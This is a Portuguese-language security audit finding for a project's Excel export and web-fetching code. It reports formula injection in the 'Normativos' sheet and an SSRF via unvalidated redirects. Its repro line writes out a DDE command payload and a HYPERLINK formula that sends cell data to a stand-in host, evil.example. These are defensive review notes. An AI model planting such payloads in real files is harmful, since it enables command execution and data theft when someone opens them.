# Revisão final · segurança (security-auditor, sobre `master` `d4cab80`, 23/09)

## 🚨 CRÍTICO — injeção de fórmula na aba "Normativos"
- `excel_export.py:277-283` (`_write_data_row`: `nome`, `ementa`, `numero`, `categoria`, `situacao`, `found_by`,
  `orgao_emissor`); origem `google_searcher.py:338,408` (`nome = title or url`, `ementa = snippet` — texto de página web,
  controlável por terceiros).
- A frente neutralizou `=` na aba nova ("Diagnóstico") e nos status, mas a aba **Normativos** — a principal — grava o
  texto cru. **Repro executado:** `nome='=cmd|"/c calc"!A0'` e `ementa='=HYPERLINK("http://evil.example/"&A1,"clique")'`
  → células com `data_type='f'` (fórmula real). Impacto: DDE / exfiltração ao abrir o `.xlsx`.
- ⚠ Histórico: o plano (triagem da rodada 1, "Rejeitados") tinha deixado isto **fora do escopo** como pré-existente e o
  registrou em `_TODO.md` P3. O reviewer final classifica como crítico.

## 🔶 ALTO — SSRF: redirect não revalidado em `_fetch_page_metadata`
- `google_searcher.py:447-486`: `_is_safe_url` valida o host uma vez; `requests.get` segue redirect por padrão, e o destino
  (ex. `169.254.169.254`, `127.0.0.1`) nunca é revalidado; janela de DNS-rebinding entre os dois lookups.
- Baixo, junto: `response.content` lido inteiro, sem limite de tamanho.

## Confirmações (não novos)
- openpyxl só marca fórmula para string que começa com `=` (testado) — a decisão do projeto está certa.
- urllib3 DEBUG e os furos do regex de `redigir` — confirmados, severidade P3 adequada.
- `_md_html`/`_md_texto`/`_md_codigo` resistiram às tentativas de quebra; o link de "Ver detalhes" só aceita `http(s)://`.
